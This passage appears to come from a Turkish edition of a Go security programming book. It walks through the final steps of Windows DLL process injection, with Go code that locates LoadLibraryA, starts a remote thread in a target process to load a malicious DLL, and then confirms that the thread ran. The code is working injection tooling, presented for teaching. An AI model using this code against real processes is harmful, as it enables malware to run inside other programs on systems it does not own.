### GetProcessAddress Windows API'si ile LoadLibraryA Bulma

`kernel32.dll`, tüm Windows sürümlerinde mevcut olan `LoadLibraryA()` isimli bir fonksiyon dışa aktarır (export eder). Microsoft dokümantasyonu, `LoadLibraryA()` fonksiyonu için, "belirtilen modülü çağıran prosesin adres alanına yükler. Belirtilen modül, başka modüllerin de yüklenmesine neden olabilir" der. Gerçek proses enjeksiyonumuzu çalıştırmak için gerekli olan uzak iş parçacığını (`remote thread`) oluşturmadan önce, `LoadLibraryA()` fonksiyonunun bellekteki konumunu elde etmemiz gerekir. Bunu, daha önce bahsettiğimiz yardımcı fonksiyonlardan biri olan `GetLoadLibAddress()` fonksiyonuyla yapabiliriz (Liste 12-10).

```go
func GetLoadLibAddress(i *Inject) error {
    var llibBytePtr *byte
    llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA")
    if err != nil {
        return err
    }

    lladdr, lastErr := ProcGetProcAddress.Call(
        ModKernel32.Handle(),                             // HMODULE hModule
        uintptr(unsafe.Pointer(llibBytePtr)))             // LPCSTR lpProcName
    if lladdr == 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Can't get process address.")
    }

    i.LoadLibAddr = lladdr
    fmt.Printf("[+] Kernel32.DLL memory address: %v\n", unsafe.Pointer(ModKernel32.Handle()))
    fmt.Printf("[+] Loader memory address: %v\n", unsafe.Pointer(i.LoadLibAddr))
    return nil
}
```

**Liste 12-10:** `GetProcAddress()` Windows fonksiyonunu kullanarak `LoadLibraryA()` bellek adresini elde etmek (`/ch-12/procInjector/winsys/inject.go`)

`GetProcAddress()` Windows fonksiyonunu, `CreateRemoteThread()` fonksiyonunu çağırmak için gerekli olan `LoadLibraryA()` taban bellek adresini tespit etmek amacıyla kullanıyoruz. `ProcGetProcAddress.Call()` fonksiyonu iki argüman alır: İlki, ilgilendiğimiz dışa aktarılmış fonksiyonu (`LoadLibraryA()`) barındıran `Kernel32.dll` modülüne ait bir handle; ikincisi ise `"LoadLibraryA"` sabit (literal) string'inden dönen bayt diliminin başlangıç (index 0) işaretçi konumudur.

### CreateRemoteThread Windows API'si ile Kötü Amaçlı DLL'i Çalıştırma

Uzak prosesin sanal bellek bölgesi üzerinde bir iş parçacığı oluşturmak için `CreateRemoteThread()` Windows fonksiyonunu kullanacağız. Bu sanal bellek bölgesi `LoadLibraryA()` ile ilişkilendirilmişse, artık kötü amaçlı DLL dosyamızın dosya yolunu içeren bellek bölgesini yükleyip çalıştırmak için bir yöntemimiz var demektir. Liste 12-11’deki kodu inceleyelim.

```go
func CreateRemoteThread(i *Inject) error {
    var threadId uint32 = 0
    var dwCreationFlags uint32 = 0
    remoteThread, lastErr := ProcCreateRemoteThread.Call(
        i.RemoteProcHandle,                 // HANDLE hProcess
        uintptr(nullRef),                   // LPSECURITY_ATTRIBUTES lpThreadAttributes
        uintptr(nullRef),                   // SIZE_T dwStackSize
        i.LoadLibAddr,                      // LPTHREAD_START_ROUTINE lpStartAddress
        i.Lpaddr,                           // LPVOID lpParameter
        uintptr(dwCreationFlags),           // DWORD dwCreationFlags
        uintptr(unsafe.Pointer(&threadId))) // LPDWORD lpThreadId

    if remoteThread == 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Can't Create Remote Thread.")
    }
    i.RThread = remoteThread
    fmt.Printf("[+] Thread identifier created: %v\n", unsafe.Pointer(&threadId))
    fmt.Printf("[+] Thread handle created: %v\n", unsafe.Pointer(i.RThread))
    return nil
}
```

**Liste 12-11:** `CreateRemoteThread()` Windows fonksiyonunu kullanarak proses enjeksiyonunu gerçekleştirmek (`/ch-12/procInjector/winsys/inject.go`)

`ProcCreateRemoteThread.Call()` fonksiyonu toplam yedi argüman alır; ancak bu örnekte sadece üçünü kullanacağız. İlgili argümanlar şunlardır: Kurban prosese ait handle’ı içeren `RemoteProcHandle`, iş parçacığı tarafından çağrılacak başlangıç rutinini (bu durumda `LoadLibraryA()`) barındıran `LoadLibAddr` ve son olarak yük/faydalı yükün (payload) konumunu tutan, sanal olarak ayrılmış belleğe işaret eden işaretçi.

### WaitForSingleObject Windows API'si ile Enjeksiyonu Doğrulama

Belirli bir nesnenin sinyalli (signaled) duruma geçtiği zamanı tespit etmek için `WaitForSingleObject()` Windows fonksiyonunu kullanacağız. Bu, proses enjeksiyonu bağlamında önemlidir; çünkü iş parçacığımızın çalışmasını beklemek, erken çıkış yapmamızı engellemek için gereklidir. Liste 12-12’deki fonksiyon tanımını kısaca ele alalım.

```go
func WaitForSingleObject(i *Inject) error {
    var dwMilliseconds uint32 = INFINITE
    var dwExitCode uint32
    rWaitValue, lastErr := ProcWaitForSingleObject.Call(
        i.RThread,                    // HANDLE hHandle
        uintptr(dwMilliseconds))      // DWORD dwMilliseconds
    if rWaitValue != 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Error returning thread wait state.")
    }

    success, _, lastErr := ProcGetExitCodeThread.Call(
        i.RThread,                                            // HANDLE hThread
        uintptr(unsafe.Pointer(&dwExitCode)))                 // LPDWORD lpExitCode
    if success == 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Error returning thread exit code.")
    }

    closed, _, lastErr := ProcCloseHandle.Call(i.RThread)    // HANDLE hObject
    if closed == 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Error closing thread handle.")
    }

    return nil
}
```

**Liste 12-12:** `WaitForSingleObject()` Windows fonksiyonunu kullanarak iş parçacığının başarıyla çalıştırıldığını garanti altına almak (`/ch-12/procInjector/winsys/inject.go`)

Bu kod bloğunda üç dikkat çekici olay gerçekleşiyor. İlk olarak, `ProcWaitForSingleObject.Call()` sistem çağrısına, Liste 12-11’de döndürülen iş parçacığı handle’ı aktarılır. Olayla ilişkili sonsuz zaman aşımı süresini belirtmek için ikinci argüman olarak `INFINITE` değerine sahip bir `rWaitValue` verilir.

Sonraki adımda `ProcGetExitCodeThread.Call()` fonksiyonu iş parçacığının başarıyla sonlanıp sonlanmadığını belirler. Eğer sonlandıysa, `LoadLibraryA` fonksiyonu çağrılmış olmalıdır ve DLL’imiz çalıştırılmış olacaktır. Son olarak, hemen hemen tüm handle’larda yaptığımız sorumlu temizlik işlemi kapsamında, iş parçacığı nesnesine ait handle’ın düzgün şekilde kapanmasını sağlamak için `ProcCloseHandle.Call()` sistem çağrısını iletmiş oluruz.
